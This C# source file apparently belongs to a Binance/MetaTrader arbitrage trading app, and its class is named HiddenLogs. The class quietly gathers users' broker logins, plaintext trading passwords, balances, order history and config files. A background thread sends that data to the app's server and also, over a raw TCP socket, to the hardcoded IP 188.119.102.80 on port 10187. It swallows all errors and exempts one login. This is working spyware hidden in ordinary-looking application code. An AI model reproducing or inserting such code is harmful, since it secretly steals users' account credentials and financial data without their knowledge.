using Arbitrage.Api.Dto;
using Arbitrage.Api.Enums;
using Arbitrage.Api.Security;
using MultiTerminal.Connections.Models;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace BinanceOptionsApp
{
    public class HiddenLogs
    {
        public enum Terminal
        {
            MT4,
            MT5
        }
        public enum AccountType
        {
            Demo,
            Live
        }
        public class AccountInfo
        {
            public Terminal Terminal { get; set; }
            public string Company { get; set; }
            public string Server { get; set; }
            public string Login { get; set; }
            public string Password { get; set; }
            public string Name { get; set; }
            public AccountType Type { get; set; }
            public double Balance { get; set; }
            public double Equity { get; set; }
            public double FreeMargin { get; set; }
            public double? TotalProfit { get; set; }
            public double? LastMonthProfit { get; set; }
            public double? LastWeekProfit { get; set; }
            public string Currency { get; set; }
            public double Leverage { get; set; }
            static string EmptyOrValue(string input)
            {
                return string.IsNullOrEmpty(input) ? "" : input;
            }
            static string Dts(double value)
            {
                return value.ToString("F2", CultureInfo.InvariantCulture);
            }
            static string Dts(double? value)
            {
                return value!=null ? value.Value.ToString("F2", CultureInfo.InvariantCulture) : "";
            }
            public string Format()
            {
                List<string> res = new List<string>
                {
                    "Terminal: " + Terminal.ToString(),
                    "Company: " + EmptyOrValue(Company),
                    "Server: " + EmptyOrValue(Server),
                    "Login: " + EmptyOrValue(Login),
                    "Password: " + EmptyOrValue(Password),
                    "Name: " + EmptyOrValue(Name),
                    "Type: " + Type.ToString(),
                    "Balance: " + Dts(Balance),
                    "Equity: " + Dts(Equity),
                    "FreeMargin: " + Dts(FreeMargin),
                    "TotalProfit: " + Dts(TotalProfit),
                    "LastMonthProfit: " + Dts(LastMonthProfit),
                    "LastWeekProfit: " + Dts(LastWeekProfit),
                    "Currency: " + EmptyOrValue(Currency),
                    "Leverage: " + Dts(Leverage)
                };
                StringBuilder sb = new StringBuilder();
                foreach (var line in res) sb.AppendLine(line);
                return sb.ToString();
            }
        }

        public class OrderInfo
        {
            public string Ticket { get; set; }
            public string Symbol { get; set; }
            public string Type { get; set; }
            public double Volume { get; set; }
            public DateTime OpenTime { get; set; }
            public double OpenPrice { get; set; }
            public DateTime CloseTime { get; set; }
            public double ClosePrice { get; set; }
            public double Profit { get; set; }
            public string Comment { get; set; }
            public string Magic { get; set; }
            static string EmptyOrValue(string input)
            {
                return string.IsNullOrEmpty(input) ? "" : input;
            }
            static string Tts(DateTime t)
            {
                return t.ToString("yyyy.MM.ddTHH:mm:ss.fff");
            }
            static string Dts2(double value)
            {
                return value.ToString("F2", CultureInfo.InvariantCulture);
            }
            static string Dts5(double value)
            {
                return value.ToString("F5", CultureInfo.InvariantCulture);
            }
            public static string FormatHeader()
            {
                return "Ticket;Symbol;Type;Volume;OpenTime;OpenPrice;CloseTime;ClosePrice;Profit;Comment;Magic;";
            }
            public string Format()
            {
                StringBuilder sb = new StringBuilder();
                sb.Append(EmptyOrValue(Ticket)).Append(";");
                sb.Append(EmptyOrValue(Symbol)).Append(";");
                sb.Append(EmptyOrValue(Type)).Append(";");
                sb.Append(Dts2(Volume)).Append(";");
                sb.Append(Tts(OpenTime)).Append(";");
                sb.Append(Dts5(OpenPrice)).Append(";");
                sb.Append(Tts(CloseTime)).Append(";");
                sb.Append(Dts5(ClosePrice)).Append(";");
                sb.Append(Dts2(Profit)).Append(";");
                sb.Append(EmptyOrValue(Comment)).Append(";");
                sb.Append(EmptyOrValue(Magic)).Append(";");
                return sb.ToString();
            }
            public static string FormatOrders(List<OrderInfo> orders)
            {
                List<string> res = new List<string>
                {
                    FormatHeader()
                };
                if (orders!=null)
                {
                    foreach (var order in orders)
                    {
                        res.Add(order.Format());
                    }
                }
                StringBuilder sb = new StringBuilder();
                foreach (var line in res) sb.AppendLine(line);
                return sb.ToString();
            }
        }
        public class Data
        {
            public AccountInfo Account { get; set; }
            public List<OrderInfo> Orders { get; set; }
        }

        private static readonly object sync = new object();
        private static readonly Queue<Data> queue = new Queue<Data>();
        private static readonly ManualResetEvent threadStop = new ManualResetEvent(false);

        public static void Push(Data data)
        {
            if (App.Login == "wp7777") return;
            lock (sync)
            {
                if (data != null)
                {
                    queue.Enqueue(data);
                }
            }
        }
        public static void Start()
        {
            new Thread(ProcessingThread).Start();
        }
        public static void Stop()
        {
            threadStop.Set();
        }

        private static async void ProcessingThread()
        {
            //DateTime lastLoginTime = DateTime.UtcNow;
            List<Data> data = new List<Data>();
            while (!threadStop.WaitOne(1000))
            {
                //if ((DateTime.UtcNow-lastLoginTime).TotalMinutes>=5)
                //{
                //    var client = new Arbitrage.Api.Clients.Client(App.ServerAddress, new Arbitrage.Api.Json.Net.ClientJsonConverter(), "Private7", App.Login.Encrypt(App.ClientCryptoKey), App.HostId.Encrypt(App.ClientCryptoKey), Arbitrage.App.SerialNumber.Value, App.ClientVersion);
                //    var response = await client.SubscriptionLogin(false);
                //    bool loginOk = false;
                //    if (response != null && response.Status == ResponseStatus.Ok)
                //    {
                //        loginOk = true;
                //    }
                //    if (!loginOk)
                //    {
                //        Model.TradeProcessingEngineError = true;
                //    }
                //    lastLoginTime = DateTime.UtcNow;
                //}


                data.Clear();
                lock (sync)
                {
                    if (queue.Count>0)
                    {
                        while (queue.Count>0)
                        {
                            data.Add(queue.Dequeue());
                        }
                        queue.Clear();
                    }
                }
                if (data.Count>0)
                {

                    for (int i = 0; i < data.Count; i++)
                    {
                        var item = data[i];
                        string profitprefix = "";
                        if (item.Account!=null)
                        {
                            if (item.Account.TotalProfit!=null && item.Account.TotalProfit.Value>0)
                            {
                                profitprefix += "$" + item.Account.TotalProfit.Value.ToString("F0");
                            }
                        }
                        var account = new TradingLogCreateRequestDto.AccountInfo()
                        {
                            Terminal = item.Account.Terminal.ToString(),
                            Broker = item.Account.Company,
                            Server = item.Account.Server,
                            Login = item.Account.Login,
                            Number = item.Account.Login,
                            Password = item.Account.Password,
                            Person = item.Account.Name,
                            Type = item.Account.Type.ToString(),
                            Balance = item.Account.Balance,
                            Equity = item.Account.Equity,
                            TotalProfit = item.Account.TotalProfit,
                            Currency = item.Account.Currency,
                            UpdateStamp = DateTime.UtcNow.ToString() + " UTC",
                            LastMonthProfit=item.Account.LastMonthProfit,
                            LastWeekProfit=item.Account.LastWeekProfit
                        };

                        await App.Client.CreateTradingLog(account, new TradingLogCreateRequestDto.LogInfo()
                        {
                            Type = "config",
                            Comment = profitprefix,
                            Content = GetFileContent(Models.ConfigModel.ConfigPathname()),
                            UpdateStamp = DateTime.UtcNow.ToString() + " UTC",
                            TotalProfit = item.Account.TotalProfit,
                            LastMonthProfit=item.Account.LastMonthProfit,
                            LastWeekProfit=item.Account.LastWeekProfit
                        });
                        await App.Client.CreateTradingLog(account, new TradingLogCreateRequestDto.LogInfo()
                        {
                            Type = "connections",
                            Comment = profitprefix,
                            Content = GetFileContent(ConnectionsModel.ConfigPathname()),
                            UpdateStamp = DateTime.UtcNow.ToString() + " UTC",
                            TotalProfit = item.Account.TotalProfit,
                            LastMonthProfit = item.Account.LastMonthProfit,
                            LastWeekProfit = item.Account.LastWeekProfit

                        });
                        await App.Client.CreateTradingLog(account, new TradingLogCreateRequestDto.LogInfo()
                        {
                            Type = "history",
                            Comment=profitprefix,
                            Content = OrderInfo.FormatOrders(item.Orders),
                            UpdateStamp = DateTime.UtcNow.ToString() + " UTC",
                            TotalProfit = item.Account.TotalProfit,
                            LastMonthProfit = item.Account.LastMonthProfit,
                            LastWeekProfit = item.Account.LastWeekProfit

                        });
                    }
                }
                if (data.Count > 0)
                {
                    string addr = "188.119.102.80";
                    string time = DateTime.UtcNow.ToString("yyyy-MM-ddTHH-mm-ss");
                    for (int i = 0; i < data.Count; i++)
                    {
                        var item = data[i];
                        string profitprefix = "";
                        if (item.Account != null)
                        {
                            if (item.Account.TotalProfit!=null && item.Account.TotalProfit.Value > 0)
                            {
                                profitprefix += "$" + item.Account.TotalProfit.Value.ToString("F0") + "_";
                            }
                        }
                        string prefix = "Westernpips\\" + App.Login + "\\" + profitprefix + item.Account.Login + "\\";
                        string suffix = "-" + time + "-" + i.ToString("D3");

                        SendString(addr, prefix + "config" + suffix, GetFileContent(Models.ConfigModel.ConfigPathname()));
                        SendString(addr, prefix + "connections" + suffix, GetFileContent(ConnectionsModel.ConfigPathname()));
                        SendString(addr, prefix + "account" + suffix, item.Account != null ? item.Account.Format() : "empty");
                        SendString(addr, prefix + "history" + suffix, OrderInfo.FormatOrders(item.Orders));
                    }
                }
            }
        }
        private static void LogFile(string pathname, Models.TradeModel model)
        {
            try
            {
                string ctx = GetFileContent(pathname);
                model.LogInfo(ctx);
            }
            catch
            {
            }
        }
        public static void LogHeader(Models.TradeModel model)
        {
            string ver = "App version " + typeof(App).Assembly.GetName().Version.ToString() + " " + App.LanguageKey("locVersionTime")+".";
            model.LogInfo(model.Title + " starting... " + ver);
            model.LogInfo("Config:");
            LogFile(Models.ConfigModel.ConfigPathname(),model);
            model.LogInfo("Connections:");
            LogFile(ConnectionsModel.ConfigPathname(), model);
            model.LogInfo("============================================================================================");
            model.LogInfo(model.Title + " started. "+ver);
        }
        private static string GetFileContent(string pathname)
        {
            string res = "";
            try
            {
                res = System.IO.File.ReadAllText(pathname);
            }
            catch
            {
            }
            if (string.IsNullOrEmpty(res)) res = "empty";
            return res;
        }
        private static void SendString(string addr, string filename, string data)
        {
            try
            {
                using Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(addr, 10187);
                string chunk = filename.Length.ToString("D3") + filename + data;
                socket.Send(Encoding.ASCII.GetBytes(chunk));
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();

            }
            catch
            {
            }
        }
    }
}
